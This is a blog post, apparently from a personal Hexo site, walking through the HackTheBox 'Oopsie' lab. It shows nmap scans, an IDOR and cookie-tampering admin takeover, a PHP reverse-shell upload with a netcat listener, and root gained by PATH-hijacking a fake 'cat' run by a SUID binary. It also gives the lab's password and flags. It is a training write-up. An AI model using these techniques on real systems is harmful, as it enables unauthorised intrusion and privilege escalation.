@@ -1,0 +1,199 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>Oopsie</title><meta name="description" content="scientia potentia est."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/hexo-theme-Claudia/images/favicon.jpg"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+Machine IP: 10.129.247.167
+Information GatheringNMAP Scanning:┌──(kali㉿kali)-[~/…/Workspace/HTB/starting/oopsie]
+└─$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.247.167
+[sudo] password for kali: 
+Host discovery disabled (-Pn). All addresses will be marked &amp;#x27;up&amp;#x27; and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.or.."><meta name="generator" content="Hexo 7.1.1"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Rãzvan's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Oopsie</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-Scanning"><span class="toc-text">NMAP Scanning:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/Very%20Easy"><i class="tag post-item-tag">Very Easy</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Oopsie</h1><time class="has-text-grey" datetime="2024-05-24T13:43:14.000Z">2024-05-24</time><article class="mt-2 post-content"><p><img src="/../oopsie_img/c5843e27067b877dfba7a82e4209a279.png" alt="alt text"></p>
+<p>Machine IP: 10.129.247.167</p>
+<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h2><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">oopsie</span>]
+└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.167</span>
+[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: 
+Host discovery disabled (<span class="hljs-literal">-Pn</span>). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan times may be slower.
+Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-21</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span> EDT
+Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">13</span>:<span class="hljs-number">42</span>
+Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">13</span>:<span class="hljs-number">42</span>, <span class="hljs-number">0.02</span>s elapsed
+DNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.02</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
+<span class="hljs-type">Initiating</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span>
+<span class="hljs-type">Scanning</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span> [<span class="hljs-number">65535</span> <span class="hljs-type">ports</span>]
+<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span>
+<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span>
+<span class="hljs-type">Completed</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span>, <span class="hljs-number">13.36</span><span class="hljs-type">s</span> <span class="hljs-type">elapsed</span> (<span class="hljs-number">65535</span> <span class="hljs-type">total</span> <span class="hljs-type">ports</span>)
+<span class="hljs-type">Nmap</span> <span class="hljs-type">scan</span> <span class="hljs-type">report</span> <span class="hljs-type">for</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span>
+<span class="hljs-type">Host</span> <span class="hljs-type">is</span> <span class="hljs-type">up</span>, <span class="hljs-type">received</span> <span class="hljs-type">user</span>-<span class="hljs-type">set</span> (<span class="hljs-number">0.048</span><span class="hljs-type">s</span> <span class="hljs-type">latency</span>)<span class="hljs-type">.</span>
+<span class="hljs-type">Scanned</span> <span class="hljs-type">at</span> <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span>:<span class="hljs-number">27</span> <span class="hljs-type">EDT</span> <span class="hljs-type">for</span> <span class="hljs-number">13</span><span class="hljs-type">s</span>
+<span class="hljs-type">Not</span> <span class="hljs-type">shown</span>: <span class="hljs-number">62472</span> <span class="hljs-type">closed</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">reset</span>), <span class="hljs-number">3061</span> <span class="hljs-type">filtered</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">no</span>-<span class="hljs-type">response</span>)
+<span class="hljs-type">Some</span> <span class="hljs-type">closed</span> <span class="hljs-type">ports</span> <span class="hljs-type">may</span> <span class="hljs-type">be</span> <span class="hljs-type">reported</span> <span class="hljs-type">as</span> <span class="hljs-type">filtered</span> <span class="hljs-type">due</span> <span class="hljs-type">to</span> --<span class="hljs-type">defeat</span>-<span class="hljs-type">rst</span>-<span class="hljs-type">ratelimit</span>
+<span class="hljs-type">PORT</span>   <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">REASON</span>
+<span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">ssh</span>     <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span>
+<span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">http</span>    <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span>
+
+<span class="hljs-type">Read</span> <span class="hljs-type">data</span> <span class="hljs-type">files</span> <span class="hljs-type">from</span>: /<span class="hljs-type">usr</span>/<span class="hljs-type">bin</span>/<span class="hljs-type">..</span>/<span class="hljs-type">share</span>/<span class="hljs-type">nmap</span>
+<span class="hljs-type">Nmap</span> <span class="hljs-type">done</span>: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> <span class="hljs-type">address</span> (<span class="hljs-number">1</span> <span class="hljs-type">host</span> <span class="hljs-type">up</span>) <span class="hljs-type">scanned</span> <span class="hljs-type">in</span> <span class="hljs-number">13.48</span> <span class="hljs-type">seconds</span>
+           <span class="hljs-type">Raw</span> <span class="hljs-type">packets</span> <span class="hljs-type">sent</span>: <span class="hljs-number">72205</span> (<span class="hljs-number">3.177</span><span class="hljs-type">MB</span>) | <span class="hljs-type">Rcvd</span>: <span class="hljs-number">65658</span> (<span class="hljs-number">2.626</span><span class="hljs-type">MB</span>)</code></pre>
+
+<p>FULL NMAP Scanning: (scanning the ports we got)</p>
+<pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">oopsie</span>]
+└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p22</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.167</span> <span class="hljs-literal">-Pn</span>                                                    
+]Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-21</span> <span class="hljs-number">13</span>:<span class="hljs-number">43</span> EDT
+Stats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">0</span> up), <span class="hljs-number">0</span> undergoing Script Pre<span class="hljs-literal">-Scan</span>
+NSE Timing: About <span class="hljs-number">0.00</span>% done
+Stats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Service Scan
+Service scan Timing: About <span class="hljs-number">50.00</span>% done; ETC: <span class="hljs-number">13</span>:<span class="hljs-number">43</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> remaining)
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.167</span>
+Host is up (<span class="hljs-number">0.045</span>s latency).
+
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh<span class="hljs-literal">-hostkey</span>: 
+|   <span class="hljs-number">2048</span> <span class="hljs-number">61</span>:e4:<span class="hljs-number">3</span>f:d4:<span class="hljs-number">1</span>e:e2:b2:f1:<span class="hljs-number">0</span>d:<span class="hljs-number">3</span>c:ed:<span class="hljs-number">36</span>:<span class="hljs-number">28</span>:<span class="hljs-number">36</span>:<span class="hljs-number">67</span>:c7 (RSA)
+|   <span class="hljs-number">256</span> <span class="hljs-number">24</span>:<span class="hljs-number">1</span>d:a4:<span class="hljs-number">17</span>:d4:e3:<span class="hljs-number">2</span>a:<span class="hljs-number">9</span>c:<span class="hljs-number">90</span>:<span class="hljs-number">5</span>c:<span class="hljs-number">30</span>:<span class="hljs-number">58</span>:<span class="hljs-number">8</span>f:<span class="hljs-number">60</span>:<span class="hljs-number">77</span>:<span class="hljs-number">8</span>d (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-number">78</span>:<span class="hljs-number">03</span>:<span class="hljs-number">0</span>e:b4:a1:af:e5:c2:f9:<span class="hljs-number">8</span>d:<span class="hljs-number">29</span>:<span class="hljs-number">05</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">29</span>:c9:f2 (ED25519)
+<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> ((Ubuntu))
+|_http<span class="hljs-literal">-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> (Ubuntu)
+|_http<span class="hljs-literal">-title</span>: Welcome
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">8.61</span> seconds</code></pre>
+
+<p> With what kind of tool can intercept web traffic? </p>
+<ul>
+<li>proxy</li>
+</ul>
+<p> What is the path to the directory on the webserver that returns a login page? </p>
+<p>Open ZAP → Open FoxyProxy Configuration → Refresh the page → Attack → Spider → </p>
+<p><img src="/../oopsie_img/1.png" alt="alt text"></p>
+<ul>
+<li>&#x2F;cdn-cgi&#x2F;login</li>
+</ul>
+<p>Login as guest </p>
+<p><img src="/../oopsie_img/2.png" alt="alt text"></p>
+<p>If we hit <code>account</code> we can see in the URL that we have a value id set to <code>2</code> let’s try to change it to something like 1:</p>
+<p><img src="/../oopsie_img/3.png" alt="alt text"></p>
+<p>We change it to 1:</p>
+<p>And we got the <code>name</code> admin .. interesting:</p>
+<p><img src="/../oopsie_img/4.png" alt="alt text"></p>
+<p>Check  &#x2F;uploads</p>
+<p><img src="/../oopsie_img/5.png" alt="alt text"></p>
+<p>Let’s intercept this with BurpSuite:</p>
+<p><img src="/../oopsie_img/6.png" alt="alt text"></p>
+<p>Send to repeater and modify user number to: <code>34322</code> (admin’s number) and role&#x3D;<code>admin</code> hit send:</p>
+<p><img src="/../oopsie_img/7.png" alt="alt text"></p>
+<p>Interesting.. now that we know it should work, go in the proxy tab modify the request to the admin’s number and role&#x3D; <code>admin</code> and hit forward:</p>
+<p><img src="/../oopsie_img/8.png" alt="alt text"></p>
+<p><strong>Voilà</strong></p>
+<p><img src="/../oopsie_img/9.png" alt="alt text"></p>
+<p>After we tried to upload something it didnt worked.. let’s try with inspect element</p>
+<p>We changed the values here aswell:</p>
+<p><img src="/../oopsie_img/10.png" alt="alt text"></p>
+<p>We uploaded a php-reverse shell and it succeeded:</p>
+<p><img src="/../oopsie_img/11.png" alt="alt text"></p>
+<p>Of course we already set up our php reverse shell with our machine IP and the port we are going to listen:</p>
+<p>Now we start a netcat on our kali:</p>
+<pre><code class="hljs powershell">nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">6666</span></code></pre>
+
+<p>Go into &#x2F;uploads&#x2F;php-reverse-shell.php</p>
+<p><img src="/../oopsie_img/12.png" alt="alt text"></p>
+<p>And we got shell </p>
+<p><img src="/../oopsie_img/13.png" alt="alt text"></p>
+<p>We forgot to answer some questions:</p>
+<p> What is the access ID of the admin user? </p>
+<ul>
+<li>34322</li>
+</ul>
+<p> On uploading a file, what directory does that file appear in on the server? </p>
+<ul>
+<li>&#x2F;uploads</li>
+</ul>
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Spawning &#x2F;bin&#x2F;bash using python:</p>
+<pre><code class="hljs powershell">python3 <span class="hljs-literal">-c</span> <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre>
+
+<p><img src="/../oopsie_img/14.png" alt="alt text"></p>
+<p>We find user flag: <code>f2c74ee8db7983851ab2a96a44eb7981</code></p>
+<p>We have a hint on the site that we may find a password in the site code, let’s check the site from our shell:</p>
+<pre><code class="hljs powershell">www<span class="hljs-literal">-data</span>@oopsie:/home/robert<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /var/www/html
+<span class="hljs-built_in">cd</span> /var/www/html
+www<span class="hljs-literal">-data</span>@oopsie:/var/www/html<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span>
+<span class="hljs-built_in">ls</span>
+cdn<span class="hljs-literal">-cgi</span>  css  fonts  images  index.php  js  themes  uploads
+www<span class="hljs-literal">-data</span>@oopsie:/var/www/html<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> cdn<span class="hljs-literal">-cgi</span>
+<span class="hljs-built_in">cd</span> cdn<span class="hljs-literal">-cgi</span>
+www<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span>
+<span class="hljs-built_in">ls</span>
+login
+www<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> login
+<span class="hljs-built_in">cd</span> login
+www<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span>/login<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span>
+<span class="hljs-built_in">ls</span>
+admin.php  db.php  index.php  script.js
+www<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span>/login<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> db.php
+<span class="hljs-built_in">cat</span> db.php
+&lt;?php
+<span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;robert&#x27;</span>,<span class="hljs-string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="hljs-string">&#x27;garage&#x27;</span>);
+?&gt;
+www<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span>/login<span class="hljs-variable">$</span> 
+</code></pre>
+
+<p>Found password : <code>M3g4C0rpUs3r!</code></p>
+<p> What is the file that contains the password that is shared with the robert user? </p>
+<ul>
+<li>db.php</li>
+</ul>
+<p> What executible is run with the option “-group bugtracker” to identify all files owned by the bugtracker group? </p>
+<p><img src="/../oopsie_img/15.png" alt="alt text"></p>
+<pre><code class="hljs powershell">robert@oopsie:/home<span class="hljs-variable">$</span> find / <span class="hljs-literal">-group</span> bugtracker <span class="hljs-number">2</span>&gt;/dev/null
+find / <span class="hljs-literal">-group</span> bugtracker <span class="hljs-number">2</span>&gt;/dev/null
+/usr/bin/bugtracker</code></pre>
+
+<ul>
+<li>find</li>
+</ul>
+<p> Regardless of which user starts running the bugtracker executable, what’s user privileges will use to run? </p>
+<ul>
+<li>root</li>
+</ul>
+<p>What SUID stands for ?</p>
+<ul>
+<li>Set owner User ID</li>
+</ul>
+<p> What is the name of the executable being called in an insecure manner? </p>
+<ul>
+<li>cat</li>
+</ul>
+<p><img src="/../oopsie_img/16.png" alt="alt text"></p>
+<p>We get an error from the cat command, essentially, the bugtracker is functioning as a front-end for the <strong><code>cat</code></strong> command, fetching files from the <strong><code>/root/reports/</code></strong> directory and adding the bug ID to access them.</p>
+<p>We’ll create a new cat file that will spawn a shell when it is ran:</p>
+<pre><code class="hljs powershell">robert@oopsie:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; <span class="hljs-built_in">cat</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; <span class="hljs-built_in">cat</span>
+robert@oopsie:/tmp<span class="hljs-variable">$</span> chmod +x <span class="hljs-built_in">cat</span>
+chmod +x <span class="hljs-built_in">cat</span>
+robert@oopsie:/tmp<span class="hljs-variable">$</span> export PATH=/tmp:<span class="hljs-variable">$PATH</span>
+export PATH=/tmp:<span class="hljs-variable">$PATH</span>
+robert@oopsie:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+robert@oopsie:/tmp<span class="hljs-variable">$</span> 
+</code></pre>
+
+<p>Run bugtracker:</p>
+<pre><code class="hljs powershell">robert@oopsie:/tmp<span class="hljs-variable">$</span> bugtracker
+bugtracker
+
+<span class="hljs-literal">------------------</span>
+: EV Bug Tracker :
+<span class="hljs-literal">------------------</span>
+
+Provide Bug ID: <span class="hljs-number">3</span>
+<span class="hljs-number">3</span>
+<span class="hljs-literal">---------------</span>
+
+<span class="hljs-comment"># whoami</span>
+whoami
+root
+<span class="hljs-comment"># </span></code></pre>
+
+<p><img src="/../oopsie_img/17.png" alt="alt text"></p>
+<p>Root Flag: <code>af13b0bee69f8a877c3faf667f7beacf</code></p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2024/05/24/Vaccine/" title="Vaccine"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Vaccine</span></a><a class="button is-default" href="/2024/05/24/Archetype/" title="Archetype"><span class="has-text-weight-semibold">Next: Archetype</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/razvan-popa-333740293"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Rãzvan 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
